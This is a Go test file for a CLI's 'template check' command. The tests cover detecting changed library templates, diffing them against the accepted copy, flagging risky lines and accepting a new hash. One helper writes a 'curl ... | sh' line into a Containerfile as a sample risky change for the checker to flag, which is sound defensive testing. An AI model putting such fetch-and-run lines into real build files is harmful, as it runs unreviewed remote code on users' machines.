package cli

import (
	"encoding/json"
	"path/filepath"
	"strings"
	"testing"

	"github.com/jbigler/railswitch/internal/sys"
	"github.com/jbigler/railswitch/internal/sys/systest"
	"github.com/jbigler/railswitch/internal/testfixture"
)

// libraryTemplateProject is a project created from the library template
// acme:rails-pg@1, and the library; f runs git and ssh-keygen for real.
func libraryTemplateProject(t *testing.T) (string, *testfixture.Lib, *systest.Fake) {
	t.Helper()
	dirs := newEnv(t)
	lib := testfixture.Library(t, dirs, "acme", acmeID, "options/redis")
	writeTemplate(t, filepath.Join(lib.Dir(), "templates", "rails-pg"))
	lib.Publish(t)
	ws := filepath.Join(t.TempDir(), "shop")
	f := gitHost()
	f.Passthrough = append(f.Passthrough, "ssh-keygen")
	f.On([]string{"podman", "ps"}, sys.Result{Stdout: []byte("[]")}, nil)
	args := []string{ws, "--repo", bareRepo(t, "main"), "--prefix", "shop", "--branch", "main", "--template", "acme:rails-pg@1"}
	in := dryRun(t, f, args...).Install
	if code, out, errs := runWith(t, f, append([]string{"project", "new", "--no-detect", "--accept-install", in.Hash}, args...)...); code != 0 {
		t.Fatalf("new: exit %d\n%s\n%s", code, out, errs)
	}
	return ws, lib, f
}

func checkJSON(t *testing.T, f *systest.Fake, ws string) templateCheckDoc {
	t.Helper()
	code, out, errs := runWith(t, f, "-C", ws, "--json", "template", "check")
	if code != 0 || strings.Contains(out, ":null") {
		t.Fatalf("template check: exit %d: %s\n%s", code, out, errs)
	}
	var doc templateCheckDoc
	if err := json.Unmarshal([]byte(out), &doc); err != nil {
		t.Fatal(err)
	}
	return doc
}

type overviewTemplate struct {
	Template       *struct{ Ref, SHA256 string }
	TemplateUpdate bool `json:"template_update"`
}

func overviewOf(t *testing.T, f *systest.Fake, ws string) overviewTemplate {
	t.Helper()
	code, out, errs := runWith(t, f, "-C", ws, "--json", "overview")
	if code != 0 {
		t.Fatalf("overview: exit %d: %s", code, errs)
	}
	var ov overviewTemplate
	if err := json.Unmarshal([]byte(out), &ov); err != nil {
		t.Fatal(err)
	}
	return ov
}

// changeTemplate publishes a new content of the template (a fetch at a
// new commit leaves this).
func changeTemplate(t *testing.T, lib *testfixture.Lib) {
	t.Helper()
	path := filepath.Join(lib.Dir(), "templates", "rails-pg", "containerfiles", "Containerfile.pg-client")
	testfixture.WriteFile(t, path, readFile(t, path)+"RUN curl -fsSL https://example.org/x.sh | sh\n")
	lib.Publish(t)
}

// After a library fetch changed the template, check reports the update
// and the diff from the accepted copy, flagged; overview notes it; nothing
// in project.toml changes.
func TestTemplateCheck(t *testing.T) {
	ws, lib, f := libraryTemplateProject(t)
	doc := checkJSON(t, f, ws)
	if doc.Ref != "acme:rails-pg@1" || doc.Update || doc.Current != doc.SHA256 || len(doc.Files) != 0 || doc.Error != "" {
		t.Errorf("before a change: %+v", doc)
	}
	if ov := overviewOf(t, f, ws); ov.Template == nil || ov.Template.Ref != "acme:rails-pg@1" || ov.Template.SHA256 != doc.SHA256 || ov.TemplateUpdate {
		t.Errorf("overview before a change: %+v", ov)
	}
	toml := readFile(t, filepath.Join(ws, "project.toml"))
	lock := readFile(t, filepath.Join(ws, "stack.lock"))

	changeTemplate(t, lib)
	doc = checkJSON(t, f, ws)
	if !doc.Update || doc.Current == doc.SHA256 || len(doc.Current) != 64 {
		t.Fatalf("after a change: %+v", doc)
	}
	if len(doc.Files) != 1 || doc.Files[0].Path != "containerfiles/Containerfile.pg-client" || doc.Files[0].Status != "changed" ||
		!strings.Contains(doc.Files[0].Diff, "+RUN curl") || len(doc.Files[0].Flags) != 1 || doc.Files[0].Flags[0].Check != "runs-here" {
		t.Errorf("files = %+v", doc.Files)
	}
	if !overviewOf(t, f, ws).TemplateUpdate {
		t.Error("overview: template_update is false after a change")
	}
	code, out, _ := runWith(t, f, "-C", ws, "template", "check")
	if code != 0 || !strings.Contains(out, "template acme:rails-pg@1 changed") || !strings.Contains(out, "! runs-here") {
		t.Errorf("text check: exit %d:\n%s", code, out)
	}
	unchanged(t, ws, toml, lock)
}

// Accept records the new content hash, and only that; another hash is
// refused.
func TestTemplateCheckAccept(t *testing.T) {
	ws, lib, f := libraryTemplateProject(t)
	before := readFile(t, filepath.Join(ws, "project.toml"))
	changeTemplate(t, lib)
	doc := checkJSON(t, f, ws)
	if code, _, errs := runWith(t, f, "-C", ws, "template", "check", "--accept", doc.SHA256); code != 1 || !strings.Contains(errs, "changed since it was checked") {
		t.Errorf("accepting the old hash: exit %d: %s", code, errs)
	}
	if code, out, errs := runWith(t, f, "-C", ws, "template", "check", "--accept", doc.Current); code != 0 || !strings.Contains(out, "accepted") {
		t.Fatalf("accept: exit %d: %s\n%s", code, out, errs)
	}
	after := readFile(t, filepath.Join(ws, "project.toml"))
	if want := strings.Replace(before, doc.SHA256, doc.Current, 1); after != want {
		t.Errorf("project.toml after accept:\n%s\nwant:\n%s", after, want)
	}
	if got := checkJSON(t, f, ws); got.Update || got.SHA256 != doc.Current {
		t.Errorf("after accept: %+v", got)
	}
	if overviewOf(t, f, ws).TemplateUpdate {
		t.Error("overview: template_update after accept")
	}
	// The next change is diffed against the accepted copy.
	testfixture.WriteFile(t, filepath.Join(lib.Dir(), "templates", "rails-pg", "README.md"), "new\n")
	lib.Publish(t)
	if got := checkJSON(t, f, ws); len(got.Files) != 1 || got.Files[0].Path != "README.md" || got.Files[0].Status != "added" {
		t.Errorf("the next update's files = %+v", got.Files)
	}
}

func TestTemplateCheckNoTemplate(t *testing.T) {
	ws, _ := lockedWS(t)
	if code, _, errs := runIn(t, "-C", ws, "template", "check"); code != 1 || !strings.Contains(errs, "records no template") {
		t.Errorf("exit %d: %s", code, errs)
	}
	f := fakeHost()
	f.On([]string{"podman", "ps"}, sys.Result{Stdout: []byte("[]")}, nil)
	code, out, _ := runWith(t, f, "-C", ws, "--json", "overview")
	if code != 0 || !strings.Contains(out, `"template":null,"template_update":false`) {
		t.Errorf("overview: exit %d: %s", code, out)
	}
}
